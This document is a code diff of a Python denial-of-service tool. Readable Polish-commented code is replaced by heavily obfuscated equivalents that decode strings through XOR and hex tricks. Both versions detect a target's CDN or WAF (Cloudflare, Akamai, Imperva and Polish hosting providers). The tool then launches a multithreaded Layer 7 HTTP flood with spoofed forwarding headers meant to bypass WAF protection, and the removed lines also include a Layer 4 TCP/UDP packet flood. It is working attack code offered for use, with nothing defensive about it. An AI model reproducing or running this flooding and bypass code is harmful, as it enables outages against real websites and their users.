+            IIllIIIIIIIllIllll = IlIIllIIIllll.get((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 118 for IlIlIIlIlIllllI in x[::-1]]).decode())([4, 19, 0, 4, 19, 37]), '').lower()
+            lIlIIlIllIlIlIIIIlIIl = IlIIllIIIllll.get((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 98)) for IlIlIllIlIIlIlllI in x)))([33, 36, 79, 48, 35, 59]))
+            lIIIlIIllIIIll = IlIIllIIIllll.get((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('79422d64657265776f502d58'), '').lower()
+            if lIlIIlIllIlIlIIIIlIIl or (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 147 for IlIlIIlIlIllllI in x[::-1]]).decode())([246, 225, 242, 255, 245, 247, 230, 252, 255, 240]) in IIllIIIIIIIllIllll or (lambda n: int.__xor__(n, 948561).to_bytes(3, 'big').decode())(7151484) in lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('727473')](IlIIllIIIllll).lower():
+                self.target_cdn = (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 68)) for IlIlIllIlIIlIlllI in x)))([7, 40, 43, 49, 32, 34, 40, 37, 54, 33])
+                lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 249 for IlIlIIlIlIllllI in x[::-1]]).decode())([141, 151, 144, 139, 137])](f'{Fore.GREEN}[+] Detected CDN: Cloudflare')
                 return
-                
-            # Sprawdź inne CDN/WAF
-            if 'akamai' in server_header:
-                self.target_cdn = 'Akamai'
-                print(f"{Fore.GREEN}[+] Detected CDN: Akamai")
-            elif 'imperva' in server_header or 'incapsula' in server_header:
-                self.target_cdn = 'Imperva'
-                print(f"{Fore.GREEN}[+] Detected WAF: Imperva")
-            elif 'ovh' in server_header:
-                self.target_cdn = 'OVHcloud'
-                print(f"{Fore.GREEN}[+] Detected Provider: OVHcloud")
-            elif 'nginx' in server_header or 'nginx' in powered_by:
-                self.target_cdn = 'NGINX'
-                print(f"{Fore.GREEN}[+] Detected Server: NGINX")
-            elif 'home.pl' in target or 'home.pl' in server_header:
-                self.target_cdn = 'home.pl'
-                print(f"{Fore.GREEN}[+] Detected Provider: home.pl")
-            elif 'cyberfolks' in server_header or 'cyber' in server_header:
-                self.target_cdn = 'cyber_Folks'
-                print(f"{Fore.GREEN}[+] Detected Provider: cyber_Folks")
-            elif 'dhosting' in server_header:
-                self.target_cdn = 'dhosting'
-                print(f"{Fore.GREEN}[+] Detected Provider: dhosting")
+            if (lambda n: int.__xor__(n, 96861473776278).to_bytes(6, 'big').decode())(63166903075839) in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 69) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('042e2428242c')
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 13) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('7d7f646379')](f'{Fore.GREEN}[+] Detected CDN: Akamai')
+            elif (lambda n: int.__xor__(n, 64212840009471638).to_bytes(7, 'big').decode())(39771864167014647) in IIllIIIIIIIllIllll or (lambda n: int.__xor__(n, 3353815952084595703549).to_bytes(9, 'big').decode())(4069950462726800249500) in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda n: int.__xor__(n, 36367323864117542).to_bytes(7, 'big').decode())(56398980948969287)
+                lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 142 for IlIlIIlIlIllllI in x[::-1]]).decode())([250, 224, 231, 252, 254])](f'{Fore.GREEN}[+] Detected WAF: Imperva')
+            elif (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 177) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('dec7d9') in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('64756f6c6348564f')
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 229) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('95978c8b91')](f'{Fore.GREEN}[+] Detected Provider: OVHcloud')
+            elif (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('786e69676e') in IIllIIIIIIIllIllll or (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 202 for IlIlIIlIlIllllI in x[::-1]]).decode())([178, 164, 163, 173, 164]) in lIIIlIIllIIIll:
+                self.target_cdn = (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 153 for IlIlIIlIlIllllI in x[::-1]]).decode())([193, 215, 208, 222, 215])
+                lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 163) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('d3d1cacdd7')](f'{Fore.GREEN}[+] Detected Server: NGINX')
+            elif (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 17)) for IlIlIllIlIIlIlllI in x)))([121, 126, 124, 116, 63, 97, 125]) in target or (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 50)) for IlIlIllIlIIlIlllI in x)))([90, 93, 95, 87, 28, 66, 94]) in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 148 for IlIlIIlIlIllllI in x[::-1]]).decode())([248, 228, 186, 241, 249, 251, 252])
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 323660293041).to_bytes(5, 'big').decode())(254103604677)](f'{Fore.GREEN}[+] Detected Provider: home.pl')
+            elif (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('736b6c6f667265627963') in IIllIIIIIIIllIllll or (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 103 for IlIlIIlIlIllllI in x[::-1]]).decode())([21, 2, 5, 30, 4]) in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 94)) for IlIlIllIlIIlIlllI in x)))([61, 39, 60, 59, 44, 1, 24, 49, 50, 53, 45])
+                lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 172386267872).to_bytes(5, 'big').decode())(379323210900)](f'{Fore.GREEN}[+] Detected Provider: cyber_Folks')
+            elif (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 192) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a4a8afb3b4a9aea7') in IIllIIIIIIIllIllll:
+                self.target_cdn = (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 230) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('828e8995928f8881')
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.GREEN}[+] Detected Provider: dhosting')
             else:
-                print(f"{Fore.YELLOW}[!] No known CDN/WAF detected")
+                lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}[!] No known CDN/WAF detected')
                 self.target_cdn = None
-                
         except Exception as e:
-            print(f"{Fore.RED}[-] Error detecting CDN: {e}")
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 213 for IlIlIIlIlIllllI in x[::-1]]).decode())([161, 187, 188, 167, 165])](f'{Fore.RED}[-] Error detecting CDN: {e}')
             self.target_cdn = None
 
-    def get_bypass_headers(self):
-        """Get appropriate bypass headers for detected CDN"""
-        if self.target_cdn and self.target_cdn in CDN_BYPASS_HEADERS:
-            return random.choice(CDN_BYPASS_HEADERS[self.target_cdn])
-        return random.choice(WAF_BYPASS_HEADERS)
+    def llIIlIlIIIllllIIllIlI(self):
+        if self.target_cdn and self.target_cdn in IIlIIIllIIIlI:
+            return IIlIlIIllllllIllllIlI(IIlIIIllIIIlI[self.target_cdn])
+        return IIlIlIIllllllIllllIlI(lIIllIIlllIIllIIlIlI)
 
-    def layer7_ddos(self, target, duration, threads=100, proxies=None, bypass_waf=True):
-        """Advanced Layer 7 DDoS with WAF bypass techniques"""
-        if not self.validate_target(target):
-            print(f"{Fore.RED}[-] Invalid target!")
+    def llIIIIIIlllIIl(self, target, duration, threads=0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 55) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('7502'), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 2)) for IlIlIllIlIIlIlllI in x)))([70, 51]), 16), proxies=None, IlIIIllllIlllIlllll=True):
+        if not self.llIllIlIIIlIllIl(target):
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.RED}[-] Invalid target!')
             return
-            
-        global packet_count, stop_attack
-        stop_attack = False
-        packet_count = 0
+        global IlIllIllIlIIlIIIIlIIIIlll, llllIIlIIlIIIIlllllIIIll
+        llllIIlIIlIIIIlllllIIIll = False
+        IlIllIllIlIIlIIIIlIIIIlll = 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 4) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('3535'), 16) ^ 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 119)) for IlIlIllIlIIlIlllI in x)))([70, 70]), 16)
         self.proxies = proxies or []
-        
-        # Detect CDN/WAF
-        if bypass_waf:
-            print(f"{Fore.CYAN}[+] Detecting CDN/WAF...")
-            self.detect_cdn(target)
-        
-        # Use scraper for better bypass
+        if IlIIIllllIlllIlllll:
+            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 148) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e4e6fdfae0')](f'{Fore.CYAN}[+] Detecting CDN/WAF...')
+            self.llllIIIlIllIlIl(target)
         try:
-            scraper = cloudscraper.create_scraper()
+            lllIlIlIlIlllllll = lIIIIlIlllIIIlIllllIIllI()
         except:
-            print(f"{Fore.YELLOW}[!] Cloudscraper not available, using requests")
-            scraper = requests.Session()
-            
-        end_time = time.time() + duration
-        
-        print(f"{Fore.RED}[+] Starting Layer 7 DDoS on {target}")
-        print(f"{Fore.RED}[+] Proxies: {len(self.proxies) if self.proxies else 'None (direct)'}")
-        print(f"{Fore.RED}[+] Threads: {threads}")
-        print(f"{Fore.RED}[+] Attack duration: {duration} seconds")
+            lIlIIIIllllIlIlIII[(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e697270')](f'{Fore.YELLOW}[!] Cloudscraper not available, using requests')
+            lllIlIlIlIlllllll = IIlllIlIIIIIIlI()
+        IlIIlIIIIIlIIIIlIlIIIlIllI = llIIIllIlIIIIlIIllllIllI() + duration
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 835771432233).to_bytes(5, 'big').decode())(768357864285)](f'{Fore.RED}[+] Starting Layer 7 DDoS on {target}')
+        lIlIIIIllllIlIlIII[(lambda n: int.__xor__(n, 280379914307).to_bytes(5, 'big').decode())(211352589879)](f"{Fore.RED}[+] Proxies: {(lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 48 for IlIlIIlIlIllllI in x[::-1]]).decode())([94, 85, 92])](self.proxies) if self.proxies else (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 16 for IlIlIIlIlIllllI in x[::-1]]).decode())([57, 100, 115, 117, 98, 121, 116, 56, 48, 117, 126, 127, 94]))}")
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 43) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('5b5942455f')](f'{Fore.RED}[+] Threads: {threads}')
+        lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 100) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('14160d0a10')](f'{Fore.RED}[+] Attack duration: {duration} seconds')
         if self.target_cdn:
-            print(f"{Fore.RED}[+] Bypassing: {self.target_cdn}")
+            lIlIIIIllllIlIlIII[(lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 34) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('52504b4c56')](f'{Fore.RED}[+] Bypassing: {self.target_cdn}')
         else:
-            print(f"{Fore.YELLOW}[+] No WAF detected, using generic bypass")
-        
-        def send_requests():
-            global packet_count, stop_attack
-            while time.time() < end_time and not stop_attack:
-                try:
-                    # Randomize IP address
-                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                    
-                    # Select random proxy if available
-                    proxy = random.choice(self.proxies) if self.proxies else None
-                    
-                    # Base headers with randomization
-                    headers = {
-                        'User-Agent': random.choice(USER_AGENTS),
-                        'Accept': random.choice([
-                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                            'application/json',
-                            '*/*'
-                        ]),
-                        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.9', 'pl-PL,pl;q=0.9']),
-                        'Accept-Encoding': random.choice(['gzip, deflate', 'gzip, deflate, br', 'identity']),
-                        'Connection': 'keep-alive',
-                        'Cache-Control': random.choice(['no-cache', 'no-store', 'max-age=0']),
-                        'Pragma': 'no-cache',
-                        'Upgrade-Insecure-Requests': '1'
-                    }
-                    
-                    # Add WAF bypass headers - SPECIFIC FOR CLOUDFLARE
-                    if bypass_waf:
-                        if self.target_cdn == 'Cloudflare':
-                            # Cloudflare specific bypass headers
-                            headers.update({
-                                'CF-Connecting-IP': fake_ip,
-                                'True-Client-IP': fake_ip,
-                                'X-Forwarded-For': f'{fake_ip}, 127.0.0.1',
-                                'X-Real-IP': fake_ip
-                            })
-                        elif self.target_cdn:
-                            # Other CDN specific headers
-                            bypass_headers = self.get_bypass_headers()
-                            headers.update(bypass_headers)
-                            headers.update({'X-Forwarded-For': fake_ip})
-                        else:
-                            # Generic WAF bypass
-                            headers.update({'X-Forwarded-For': fake_ip})
-                            headers.update(random.choice(WAF_BYPASS_HEADERS))
-                    
-                    # Add randomized cookies
-                    headers['Cookie'] = f"session={hashlib.md5(os.urandom(32)).hexdigest()}; pref={random.choice(['light', 'dark'])}; lang={random.choice(['en', 'pl', 'de'])}"
-                    # Random HTTP methods for better bypass
-                    http_methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT']
-                    method = random.choice(http_methods)
-                    
-                    # Payload for POST/PUT requests
-                    payload = {
-                        'data': random.choice(['login', 'search', 'query', 'action', 'submit']),
-                        'value': str(random.randint(1000, 999999)),
-                        'timestamp': str(int(time.time())),
-                        'random': hashlib.md5(os.urandom(16)).hexdigest(),
-                        'token': hashlib.sha256(os.urandom(32)).hexdigest()
-                    }
-                    
-                    # Make request with proxy if available
-                    if proxy:
-                        proxies_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}
-                        if method in ['POST', 'PUT']:
-                            response = scraper.request(method, target, headers=headers, data=payload, 
-                                                     proxies=proxies_dict, timeout=3, verify=False)
-                        else:
-                            response = scraper.request(method, target, headers=headers, 
-                                                     proxies=proxies_dict, timeout=3, verify=False)
-                    else:
-                        if method in ['POST', 'PUT']:
-                            response = scraper.request(method, target, headers=headers, data=payload, 
-                                                     timeout=3, verify=False)
-                        else:
-                            response = scraper.request(method, target, headers=headers, 
-                                                     timeout=3, verify=False)
-                    
-                    with lock:
-                        packet_count += 1
-                        sys.stdout.write(f"\r{Fore.GREEN}[+] Requests sent: {packet_count} | Status: {response.status_code} | Method: {method}")
-                        sys.stdout.flush()
-                        
-                except Exception as e:
-                    # Silent fail to maintain attack speed
-                    pass
-        
-        # Start threads
-        thread_list = []
-        for _ in range(min(threads, 500)):  # Limit threads to prevent overload
-            thread = threading.Thread(target=send_requests)
-            thread.daemon = True
-            thread.start()
-            thread_list.append(thread)
-        
-        # Wait for completion
-        time.sleep(duration)
-        stop_attack = True
-        
-        for thread in thread_list:
-            thread.join()
-        
-        print(f"\n{Fore.CYAN}[+] Layer 7 DDoS Attack Completed!")
-        print(f"{Fore.CYAN}[+] Total requests sent: {packet_count}")
+            lIlIIIIllllIlIlIII[(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 56 for IlIlIIlIlIllllI in x[::-1]]).decode())([76, 86, 81, 74, 72])](f'{Fore.YELLOW}[+] No WAF detected, using generic bypass')
 
-    def layer4_ddos(self, ip, port, duration, protocol="tcp"):
-        """Enhanced Layer 4 DDoS with better performance"""
-        # Validate IP
-        if not self.is_valid_ip(ip):
-            print(f"{Fore.RED}[-] Invalid IP address!")
-            return
-            
-        # Validate port
-        if not (1 <= port <= 65535):
-            print(f"{Fore.RED}[-] Invalid port number! Must be between 1-65535")
-            return
-            
-        global packet_count, stop_attack
-        stop_attack = False
-        packet_count = 0
-        end_time = time.time() + duration
-        
-        print(f"{Fore.RED}[+] Starting Layer 4 {protocol.upper()} DDoS on {ip}:{port}")
-        print(f"{Fore.RED}[+] Attack duration: {duration} seconds")
-        print(f"{Fore.RED}[+] Protocol: {protocol.upper()}")
-        
-        def send_packets():
-            global packet_count, stop_attack
-            while time.time() < end_time and not stop_attack:
+        def IIIIIIIllllIlllIIIlI():
+            global IlIllIllIlIIlIIIIlIIIIlll, llllIIlIIlIIIIlllllIIIll
+            while llIIIllIlIIIIlIIllllIllI() < IlIIlIIIIIlIIIIlIlIIIlIllI and (not llllIIlIIlIIIIlllllIIIll):
                 try:
-                    # Create randomized payload
-                    payload_size = random.randint(64, 2048)
-                    payload = os.urandom(payload_size)
-                    
-                    if protocol.lower() == "udp":
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        sock.sendto(payload, (ip, port))
+                    IlIIIIlllIlllII = f"{IlIIIlIlIlIIlIlI(0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 89)) for IlIlIllIlIIlIlllI in x)))([105]), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 83)) for IlIlIllIlIIlIlllI in x)))([98]), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 253) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('cc'), 16), 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 45)) for IlIlIllIlIIlIlllI in x)))([28, 105, 110]), 16) - 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 194) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('a6a6'), 16))}.{IlIIIlIlIlIIlIlI(0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 177 for IlIlIIlIlIllllI in x[::-1]]).decode())([129, 132]), 16) - 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 123 for IlIlIIlIlIllllI in x[::-1]]).decode())([61, 79]), 16), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('33'), 16) * 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 26) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('2f2f'), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 194) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('f2'), 16))}.{IlIIIlIlIlIIlIlI(0 .__class__((lambda n: int.__xor__(n, 246).to_bytes(1, 'big').decode())(198), 16) << 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 89)) for IlIlIllIlIIlIlllI in x)))([104]), 16) | 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 214) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e7'), 16), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('613032'), 16) - 0 .__class__((lambda x: b''.__class__([IlIlIIlIlIllllI ^ 181 for IlIlIIlIlIllllI in x[::-1]]).decode())([247, 133, 132]), 16))}.{IlIIIlIlIlIIlIlI(0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 26)) for IlIlIllIlIIlIlllI in x)))([89, 40]), 16) - 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('3143'), 16), 0 .__class__((lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('44'), 16) * 0 .__class__((lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 1)) for IlIlIllIlIIlIlllI in x)))([48, 50]), 16) + 0 .__class__((lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 8) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('30'), 16))}"
+                    proxy = IIlIlIIllllllIllllIlI(self.proxies) if self.proxies else None
+                    IlIIllIIIllll = {(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('746e6567412d72657355'): IIlIlIIllllllIllllIlI(IIIllIlllIllI), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 17) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('507272746165'): IIlIlIIllllllIllllIlI([(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('382e303d713b2a2f2a2c392e303d713b6c6d782f6e6f69746163696c7070612c6c6d782b6c6d7468782f6e6f69746163696c7070612c6c6d74682f74786574'), (lambda n: int.__xor__(n, 159370083247095927131198944313376421797).to_bytes(16, 'big').decode())(30021853960283327361563473613579737291), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 204 for IlIlIIlIlIllllI in x[::-1]]).decode())([230, 227, 230])]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 25)) for IlIlIllIlIIlIlllI in x)))([88, 122, 122, 124, 105, 109, 52, 85, 120, 119, 126, 108, 120, 126, 124]): IIlIlIIllllllIllllIlI([(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 29)) for IlIlIllIlIIlIlllI in x)))([120, 115, 48, 72, 78, 49, 120, 115, 38, 108, 32, 45, 51, 40]), (lambda n: int.__xor__(n, 4875206205296922228072962836244284).to_bytes(14, 'big').decode())(3026193189843068216505760348211461), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 167 for IlIlIIlIlIllllI in x[::-1]]).decode())([158, 137, 151, 154, 214, 156, 203, 215, 139, 235, 247, 138, 203, 215])]), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 14) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('4f6d6d6b7e7a234b606d616a676069'): IIlIlIIllllllIllllIlI([(lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6574616c666564202c70697a67'), (lambda n: int.__xor__(n, 62338588045698604768549612785022155606725).to_bytes(17, 'big').decode())(70874759450175953506167161352686579198135), (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 142) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('e7eaebe0fae7faf7')]), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('6e6f697463656e6e6f43'): (lambda n: int.__xor__(n, 714405259343795224074072).to_bytes(10, 'big').decode())(1190674633445954712576317), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 83)) for IlIlIllIlIIlIlllI in x)))([16, 50, 48, 59, 54, 126, 16, 60, 61, 39, 33, 60, 63]): IIlIlIIllllllIllllIlI([(lambda x: b''.__class__([IlIlIIlIlIllllI ^ 252 for IlIlIIlIlIllllI in x[::-1]]).decode())([153, 148, 159, 157, 159, 209, 147, 146]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 48 for IlIlIIlIlIllllI in x[::-1]]).decode())([85, 66, 95, 68, 67, 29, 95, 94]), (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 40)) for IlIlIllIlIIlIlllI in x)))([69, 73, 80, 5, 73, 79, 77, 21, 24])]), (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 195 for IlIlIIlIlIllllI in x[::-1]]).decode())([162, 174, 164, 162, 177, 147]): (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 243) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('9d9cde9092909b96'), (lambda IIllIlllllllIl: b''.fromhex(IIllIlllllllIl)[::-1].decode())('73747365757165522d6572756365736e492d65646172677055'): (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 250 for IlIlIIlIlIllllI in x[::-1]]).decode())([203])}
+                    if IlIIIllllIlllIlllll:
+                        if self.target_cdn == (lambda n: int.__xor__(n, 977915427282711839643441).to_bytes(10, 'big').decode())(663354842353329024755028):
+                            IlIIllIIIllll.update({(lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 51)) for IlIlIllIlIIlIlllI in x)))([112, 117, 30, 112, 92, 93, 93, 86, 80, 71, 90, 93, 84, 30, 122, 99]): IlIIIIlllIlllII, (lambda lllIlIllIIIIll: bytes([int.__xor__(int(lllIlIllIIIIll[IlIlIIlIlIllllI:IlIlIIlIlIllllI + 2], 16), 200) for IlIlIIlIlIllllI in range(0, len(lllIlIllIIIIll), 2)]).decode())('9cbabdade58ba4a1ada6bce58198'): IlIIIIlllIlllII, (lambda x: b''.__class__([IlIlIIlIlIllllI ^ 60 for IlIlIIlIlIllllI in x[::-1]]).decode())([78, 83, 122, 17, 88, 89, 88, 78, 93, 75, 78, 83, 122, 17, 100]): f'{IlIIIIlllIlllII}, 127.0.0.1', (lambda x: ''.join((chr(int.__xor__(IlIlIllIlIIlIlllI, 12)) for IlIlIllIlIIlIlllI in x)))([84, 33, 94, 105, 109, 96, 33, 69, 92]): IlIIIIlllIlllII})
+                        elif self.target_cdn:
+                            IIIIlIllIlIlIlIl = self.llIIlIlIIIllllIIllIlI()
+                            IlIIllIIIllll.update(IIIIlIllIlIlIlIl)
+                            IlIIllIIIllll.update({(lambda n: int.__xor__(n, 1209626934811214052338729926604616994).to_bytes(15, 'big').decode())(918274690306590891659738088713329232): IlIIIIlllIlllII})
+                        else:
+                            IlIIllIIIllll.update({(lambda n: int.__xor__(n, 1184467058713791903990391978846044919).to_bytes(15, 'big').decode())(977206055957814128410471712805203333): IlIIIIlllIlllII})
+                            IlIIllIIIllll.update(IIlIlIIllllllIllllIlI(lIIllIIlllIIllIIlIlI))
